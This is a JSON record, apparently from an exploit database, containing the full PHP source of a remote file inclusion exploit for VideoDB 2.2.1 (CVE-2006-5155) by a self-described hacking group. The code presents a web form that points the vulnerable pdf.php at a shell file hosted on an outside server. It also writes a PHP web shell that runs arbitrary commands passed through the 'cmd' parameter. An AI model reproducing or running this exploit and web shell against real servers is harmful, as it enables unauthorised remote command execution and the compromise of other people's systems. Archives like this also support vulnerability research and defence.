{
  "id": "2455",
  "title": "VideoDB 2.2.1 - &#039;pdf.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-5155",
  "vuln_type": "rce",
  "code": "<?php\r\n/*\r\n:::::::::  :::::::::: :::     ::: ::::::::::: :::        \r\n:+:    :+: :+:        :+:     :+:     :+:     :+:        \r\n+:+    +:+ +:+        +:+     +:+     +:+     +:+        \r\n+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        \r\n+#+    +#+ +#+         +#+   +#+      +#+     +#+        \r\n#+#    #+# #+#          #+#+#+#       #+#     #+#        \r\n#########  ##########     ###     ########### ########## \r\n::::::::::: ::::::::::     :::     ::::    ::::  \r\n    :+:     :+:          :+: :+:   +:+:+: :+:+:+ \r\n    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ \r\n    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ \r\n    +#+     +#+        +#+     +#+ +#+       +#+ \r\n    #+#     #+#        #+#     #+# #+#       #+# \r\n    ###     ########## ###     ### ###       ### \r\n\t\r\n\t\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n- VideoDB <= 2.2.1 Remote File Include Exploit\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n- [Script name: VideoDB 2.2.1\r\n- [Script site: http://sourceforge.net/projects/videodb/\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n-          Find by: Kacper (a.k.a Rahim)\r\n+\r\n-    DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n+\r\n-          Contact: kacper1964@yahoo.pl\r\n-                        or\r\n-           http://www.rahim.webd.pl/\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n- Special Greetz: DragonHeart ;-)\r\n- Ema: Leito, Leon, Adam, DeathSpeed, Drzewko, pepi, mivus\r\n-                 SkD, nukedclx, Ramzes\r\n-\r\n- Greetz for all users DEVIL TEAM IRC Channel !!\r\n!@ Przyjazni nie da sie zamienic na marne korzysci @!\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n-            Z Dedykacja dla osoby,\r\n-         bez ktorej nie mogl bym zyc...\r\n-           K.C:* J.M (a.k.a Magaja)\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nMala instrukcja exploita:\r\nw pliku: core/pdf.php znajdziemy kod:\r\n....\r\ndefine('FPDF', $config['pdf_module']);\r\ndefine('FPDF_FONTPATH', FPDF.'/font/');\r\n\r\nrequire_once FPDF.'/fpdf.php';\r\nrequire_once './core/functions.php';\r\nrequire_once './engines/engines.php';\r\nrequire_once './core/VariableStream.class.php';\r\n....\r\njak wida\u00e6 jest define, lecz ciagle funkcja FPDF nie jest przypisana,\r\ngratuluje pomyslu autorowy :)\r\n*/\r\n\r\n$cmd = $_POST[\"cmd\"];\r\n$glowna = $_POST[\"glowna\"];\r\n$shell = $_POST[\"shell\"];\r\n$exp= \"<title>VideoDB &lt;= 2.2.1 Remote File Include Exploit :: DEVIL TEAM :: The Best Polish Team ::</title>\"\r\n.\"<style type=\\\"text/css\\\">\"\r\n.\"body {background-color: #000000;}\"\r\n.\"body,td,th {color: #FFFFFF;}\"\r\n.\"</style><form method=\\\"post\\\" action=\\\"\".$glowna.$shell.\"?cmd=\".$cmd.\"\\\">\"\r\n.\"<div align=\\\"center\\\"><img src=\\\"http://www.rahim.webd.pl/index_r2_c3.jpg\\\"></div>\"\r\n.\"<p align=\\\"center\\\">script url: (ex. http://www.site.com/[videodb_path]/core/pdf.php?config[pdf_module]=)<br>\"\r\n.\"<input type=\\\"text\\\" name=\\\"glowna\\\" size=\\\"90\\\"\".$glowna.\"\\\">\"\r\n.\"<br>\"\r\n.\"shell url: (ex. http://www.site.com/[path]/shell.txt?) shell.txt (CHMOD 777)<br>\"\r\n.\"<input type=\\\"text\\\" name=\\\"shell\\\" size=\\\"90\\\"\".$shell.\"\\\">\"\r\n.\"<br>\"\r\n.\"cmd: (ex. ls -la)<br>\"\r\n.\"<input name=\\\"cmd\\\" type=\\\"text\\\" size=\\\"90\\\"\".$cmd.\"\\\">\"\r\n.\"<br>\"\r\n.\"<input type=\\\"submit\\\" value=\\\"Exploit\\\" name=\\\"submit\\\">\"\r\n.\"</p>\"\r\n.\"<p align=\\\"center\\\">Find by: <a href=\\\"mailto:kacper1964@yahoo.pl\\\">Kacper</a> (a.k.a <a href=\\\"mailto:kacper1964@yahoo.pl\\\">Rahim</a>)<br>\"\r\n.\"<br>\"\r\n.\"DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam<br>\"\r\n.\"<br>\"\r\n.\"Contact: <a href=\\\"mailto:kacper1964@yahoo.pl\\\">kacper1964@yahoo.pl</a><br>\"\r\n.\"or</p>\"\r\n.\"<p align=\\\"center\\\"> <a href=\\\"http://www.rahim.webd.pl/\\\">http://www.rahim.webd.pl/</a></p>\"\r\n.\"<p align=\\\"center\\\" class=\\\"name\\\">&nbsp;</p>\"\r\n.\"<HR WIDTH=\\\"650\\\" ALIGN=\\\"center\\\">\"\r\n.\"<p align=\\\"center\\\"> Z Dedykacja dla osoby,<br>\"\r\n.\"bez ktorej nie mogl bym zyc...<br>\"\r\n.\"K.C:* J.M (a.k.a Magaja)</p>\"\r\n.\"<p align=\\\"center\\\">&nbsp;</p>\"\r\n.\"<p align=\\\"center\\\"> Special Greetz: DragonHeart ;-)<br>\"\r\n.\"Ema: Leito, Leon, Adam, DeathSpeed, Drzewko, pepi<br>\"\r\n.\"SkD, nukedclx, Ramzes<br>\"\r\n.\"<br>\"\r\n.\"Greetz for all users DEVIL TEAM IRC Channel !!<br>\"\r\n.\"!@ Przyjazni nie da sie zamienic na marne korzysci @!</p>\"\r\n.\"<HR WIDTH=\\\"650\\\" ALIGN=\\\"center\\\">\"\r\n.\"<p align=\\\"center\\\">&nbsp;</p>\"\r\n.\"</form>\";\r\n\r\nif (!isset($_POST['submit'])) \r\n{\r\necho $exp;\r\n}else{\r\n$file = fopen (\"shell.txt\", \"w+\");\r\nfwrite($file, '<?php ob_clean();echo\"Hacker_Kacper_Made_in_Poland:)\";ini_set(\"max_execution_time\",0);passthru($_GET[\"cmd\"]);die;?>');\r\nfclose($file);\r\n$file = fopen ($shell, \"r\");\r\nif (!$file) {\r\n    echo \"<p>Don't Find shell :( Insert in FTP shell.txt.\\n\";\r\n    exit;\r\n}\r\necho $exp;\r\nwhile (!feof ($file)) {\r\n    $line .= fgets ($file, 1024).\"<br>\";\r\n    }\r\n$tpos1 = strpos($line, \"++BEGIN++\");\r\n$tpos2 = strpos($line, \"++END++\");\r\n$tpos1 = $tpos1+strlen(\"++BEGIN++\");\r\n$tpos2 = $tpos2-$tpos1;\r\n$output = substr($line, $tpos1, $tpos2);\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-09-29]",
  "url": "https://www.exploit-db.com/exploits/2455"
}